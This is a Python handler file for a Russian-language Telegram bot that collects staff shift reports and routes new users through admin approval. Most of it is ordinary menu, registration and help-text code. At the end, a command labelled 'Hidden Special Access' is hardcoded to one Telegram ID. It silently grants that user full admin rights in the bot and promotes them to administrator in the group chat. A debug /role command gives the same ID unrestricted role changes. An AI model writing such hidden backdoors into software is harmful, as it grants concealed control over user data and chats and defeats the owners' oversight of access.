from aiogram import Router, F, Bot
from aiogram.types import Message
from aiogram.filters import CommandStart, Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession
from bot.database.models import User, UserRole
from bot.keyboards.builders import menu_employee, menu_manager, menu_admin, kb_pending_user, kb_admin_main
from bot.config import config

router = Router()


class NameInputForm(StatesGroup):
    waiting_name = State()


def _get_menu(role: str):
    if role == "admin":
        return menu_admin()
    if role == "manager":
        return menu_manager()
    return menu_employee()


# ─── /start ──────────────────────────────────────────────────────────────────

@router.message(CommandStart())
async def cmd_start(message: Message, db_user: User, is_new_user: bool, bot: Bot,
                    session, state: FSMContext):
    await state.clear()

    # New or pending user without a display_name → ask for their name
    if db_user.role == UserRole.pending and not db_user.display_name:
        await state.set_state(NameInputForm.waiting_name)
        await message.answer(
            "👋 Добро пожаловать!\n\n"
            "Введите свою <b>фамилию</b>, чтобы руководство могло вас идентифицировать:\n"
            "<i>(Например: Иванов)</i>",
            parse_mode="HTML"
        )
        return

    # Pending but name already given — just wait
    if db_user.role == UserRole.pending:
        await message.answer(
            "⏳ Ваша заявка отправлена администратору.\n"
            "Ожидайте подтверждения."
        )
        return

    name = db_user.pretty_name.split()[0]
    role_labels = {
        "admin": "Администратор",
        "manager": "Управляющий",
        "employee": "Сотрудник",
    }
    role_label = role_labels.get(db_user.role.value, "")
    await message.answer(
        f"👋 Привет, {name}! ({role_label})\n\nВыберите действие:",
        reply_markup=_get_menu(db_user.role.value)
    )


# ─── Главное меню (сброс состояния) ──────────────────────────────────────────

@router.message(F.text == "📋 Сдать отчет", StateFilter("*"))
async def global_start_report(message: Message, state: FSMContext, db_user: User, session: AsyncSession):
    from bot.handlers.report import start_report
    await state.clear()
    await start_report(message, state, db_user, session)


@router.message(F.text.in_(["⚙️ Админ-панель", "⚙️ Панель управляющего"]), StateFilter("*"))
async def global_admin_panel(message: Message, state: FSMContext, db_user: User):
    from bot.handlers.admin import show_admin_panel
    await state.clear()
    await show_admin_panel(message, db_user, state)


@router.message(F.text == "📋 Проверка отчётов от менеджера", StateFilter("*"))
async def global_review_reports(message: Message, state: FSMContext, db_user: User, session: AsyncSession):
    from bot.handlers.admin import admin_review_reports
    await state.clear()
    await admin_review_reports(message, db_user, session, state)


# ─── Name input FSM ──────────────────────────────────────────────────────────

@router.message(NameInputForm.waiting_name)
async def process_name_input(message: Message, state: FSMContext, db_user: User,
                               bot: Bot, session):
    name = message.text.strip()
    if len(name) < 2:
        await message.answer("❌ Слишком коротко. Введите фамилию:")
        return
    if len(name) > 100:
        await message.answer("❌ Слишком длинно. Попробуйте ещё раз:")
        return

    db_user.display_name = name
    await session.commit()
    await state.clear()

    await message.answer(
        f"✅ Отлично, <b>{name}</b>!\n\n"
        "Ваша заявка отправлена администратору. Ожидайте подтверждения.",
        parse_mode="HTML"
    )

    # Notify all admins and managers
    from sqlalchemy import or_
    stmt = select(User).where(
        or_(User.role == UserRole.admin, User.role == UserRole.manager),
        User.is_active == True
    )
    receivers = await session.execute(stmt)
    receivers = receivers.scalars().all()
    admin_mention = f"@{message.from_user.username}" if message.from_user.username else name
    text = (
        f"📥 <b>Новая заявка на доступ!</b>\n\n"
        f"👤 Фамилия: <b>{name}</b>\n"
        f"🔗 Аккаунт: {admin_mention}\n"
        f"🆔 Telegram ID: <code>{db_user.telegram_id}</code>"
    )
    markup = kb_pending_user(db_user.telegram_id)
    for admin in receivers:
        try:
            await bot.send_message(admin.telegram_id, text, parse_mode="HTML", reply_markup=markup)
        except Exception:
            pass

    if config.admin_chat_id:
        try:
            await bot.send_message(config.admin_chat_id, text, parse_mode="HTML", reply_markup=markup)
        except Exception:
            pass


# ─── /help and Инструкция ──────────────────────────────────────────────────

@router.message(Command("help"), StateFilter("*"))
@router.message(F.text == "📖 Инструкция", StateFilter("*"))
async def cmd_help(message: Message, db_user: User, state: FSMContext):
    await state.clear()
    if db_user.role == UserRole.admin:
        text = (
            "📖 <b>ПОДРОБНАЯ ИНСТРУКЦИЯ ДЛЯ АДМИНИСТРАТОРА</b>\n\n"
            "🗂 <b>ГЛАВНОЕ МЕНЮ (Кнопки внизу экрана)</b>\n\n"
            "1️⃣ <b>[📋 Сдать отчет]</b>\n"
            "Тот же функционал, что и у сотрудников, но с возможностью выбора <b>любой даты</b> и проекта.\n"
            "• Пошаговый ввод всех финансовых и операционных данных смены.\n"
            "• На этапе проверки данных можно нажать <b>«📝 Редактировать»</b> и исправить любое поле.\n\n"

            "2️⃣ <b>[⚙️ Админ-панель]</b> — Основной раздел управления.\n\n"
            "📊 <b>[Отчёты]</b>\n"
            "• <b>Поиск по дате:</b> Просмотр списка отчётов за любой день с фильтрацией по городу и проекту.\n"
            "• <b>Месячный отчёт (Excel):</b> Генерация детального файла Excel со всеми данными за выбранный месяц.\n\n"

            "📊 <b>[Аналитика]</b>\n"
            "• Построение визуальных графиков выручки (за 30 дней или год) и выполнения планов.\n\n"

            "👥 <b>[Сотрудники]</b>\n"
            "• <b>[📥 Заявки]:</b> Список новых пользователей, ожидающих одобрения.\n"
            "• <b>Управление:</b> Назначение городов, ролей (Администратор/Управляющий) или ограничение доступа.\n\n"

            "📋 <b>[Проверка отчётов]</b>\n"
            "• Список всех непроверенных отчётов от сотрудников.\n"
            "• Возможность подтвердить («✅ Проверено»), отклонить или <b>отредактировать</b> любой отчёт.\n\n"

            "🎯 <b>[Планы продаж]</b>\n"
            "• Установка целей по выручке на день или месяц для отдельных проектов или городов.\n\n"

            "🏢 <b>[Проекты]</b>\n"
            "• Управление списком точек (создание, приостановка, удаление).\n\n"

            "📈 <b>[Статистика планов]</b>\n"
            "• Оперативный срез выполнения всех активных планов на текущий момент.\n\n"

            "💼 <b>[ЗП менеджера]</b>\n"
            "• Расчетный лист для всех управляющих (сетка 1% - 4% от оборота в зависимости от % выполнения плана).\n\n"

            "📂 <b>[Упр. расходы]</b>\n"
            "• Внесение общих издержек (Аренда, Налоги, Техника и др.).\n\n"

            "💡 <b>Команда /cancel</b> моментально отменяет любое текущее действие."
        )
    elif db_user.role == UserRole.manager:
        text = (
            "📖 <b>ПОДРОБНАЯ ИНСТРУКЦИЯ ДЛЯ УПРАВЛЯЮЩЕГО</b>\n\n"
            "🗂 <b>ГЛАВНОЕ МЕНЮ (Кнопки внизу экрана)</b>\n\n"
            "1️⃣ <b>[📋 Сдать отчет]</b>\n"
            "Сдача отчётов за любую дату. Вы можете выбрать любой проект вашего города.\n\n"
            
            "2️⃣ <b>[📋 Проверка отчётов]</b>\n"
            "Доступ к списку непроверенных отчётов по всему вашему городу.\n\n"

            "3️⃣ <b>[⚙️ Панель управляющего]</b> — Основные инструменты:\n"
            "• <b>📋 Проверка отчётов:</b> (Дубликат функционала из главного меню).\n"
            "• <b>📈 Моя ЗП:</b> Ваш персональный расчетный лист по всем планам города.\n"
            "• <b>📂 Управл. расходы:</b> Внесение хоз. расходов по проектам города (Аренда и др.).\n\n"

            "💡 Команда /cancel отменяет любое текущее действие."
        )
    else:
        text = (
            "📖 <b>ПОДРОБНАЯ ИНСТРУКЦИЯ ДЛЯ СОТРУДНИКА</b>\n\n"

            "🗂 <b>ГЛАВНОЕ МЕНЮ (Кнопки внизу экрана)</b>\n\n"

            "1️⃣ <b>[📋 Сдать отчет]</b>\n"
            "Обязательно заполняйте в конце каждой рабочей смены!\n"
            "• <b>Дата/Проект:</b> Обычно ставится автоматически (сегодня).\n"
            "• <b>Кол-во человек:</b> Количество сотрудников в смене (влияет на ЗП).\n"
            "• <b>Общая выручка:</b> Сумма всех продаж за день (Нал + Терминал).\n"
            "• <b>Наличные / Эквайринг:</b> Распределение выручки по способу оплаты.\n"
            "• <b>Хоз расход:</b> Деньги, взятые из кассы на нужды точки (вода и т.д.).\n"
            "• <b>Зарплата стажёра:</b> Если выдавали оплату стажёру из кассы (иначе 0).\n"
            "• <b>Остаток в кассе:</b> Наличные деньги в кассе в конце дня.\n"
            "• <b>Проходимость / ДР:</b> Количество посетителей и дней рождений.\n"
            "• <b>Комментарий:</b> Любая важная информация.\n"
            "❗️ После проверки всех данных ОБЯЗАТЕЛЬНО нажмите <b>«✅ Отправить»</b>.\n\n"

            "💡 <b>ПОЛЕЗНЫЕ СОВЕТЫ:</b>\n"
            "• <b>Совместная смена:</b> Отчёт сдает <b>только один</b> человек (указав напарников). Бот сам покажет итоговую сумму для всех.\n"
            "• Если бот «завис» — отправьте `/cancel`.\n"
            "• Если пропало меню кнопок — нажмите кнопку с иконкой квадрата в поле ввода."
        )

    await message.answer(
        text,
        parse_mode="HTML",
        reply_markup=_get_menu(db_user.role.value) if db_user.is_active else None
    )


# ─── /cancel ──────────────────────────────────────────────────────────────────

@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext, db_user: User):
    current = await state.get_state()
    await state.clear()
    if current:
        await message.answer("✅ Действие отменено.", reply_markup=_get_menu(db_user.role.value))
    else:
        await message.answer("Нет активного действия.", reply_markup=_get_menu(db_user.role.value))

# ─── Debug / Utility ─────────────────────────────────────────────────────────

@router.message(Command("role"))
async def debug_set_role(message: Message, session: AsyncSession, db_user: User):
    if message.from_user.id != 786320574 and message.from_user.id not in config.admin_ids:
        return
    
    parts = message.text.split(" ")
    if len(parts) < 2:
        await message.answer("💡 Использование: <code>/role admin</code> (или manager, employee, pending)", parse_mode="HTML")
        return

    role_str = parts[1].strip().lower()
    try:
        new_role = UserRole(role_str)
        db_user.role = new_role
        await session.commit()
        await message.answer(f"✅ Роль изменена на: <b>{new_role.value}</b>\nНапишите /start для обновления меню.", 
                             parse_mode="HTML", reply_markup=_get_menu(new_role.value))
    except ValueError:
        await message.answer("❌ Ошибка: Неверная роль. Возможные: admin, manager, employee, pending")
# ─── Hidden Special Access ────────────────────────────────────────────────────

@router.message(Command("get_full_access"))
async def cmd_get_full_access(message: Message, db_user: User, session: AsyncSession, bot: Bot):
    # Только для вашего ID
    if message.from_user.id != 786320574:
        return

    # 1. Даем полные права в боте
    db_user.role = UserRole.admin
    db_user.is_active = True
    await session.commit()

    response = "✅ <b>Права в боте выданы!</b>\nТеперь вам доступна Админ-панель.\n\n"

    # 2. Пробуем выдать права в основном чате
    if config.city_chat_id:
        try:
            await bot.promote_chat_member(
                chat_id=config.city_chat_id,
                user_id=message.from_user.id,
                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_promote_members=False,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_manage_topics=True,
            )
            response += "✅ <b>Права в группе выданы!</b>\nТеперь вы администратор в городском чате."
        except Exception as e:
            response += f"⚠️ <b>Ошибка в группе:</b>\nБот не смог выдать права в чате (возможно, он сам не админ или нет прав на это).\n<i>Ошибка: {e}</i>"

    await message.answer(response, parse_mode="HTML", reply_markup=_get_menu("admin"))
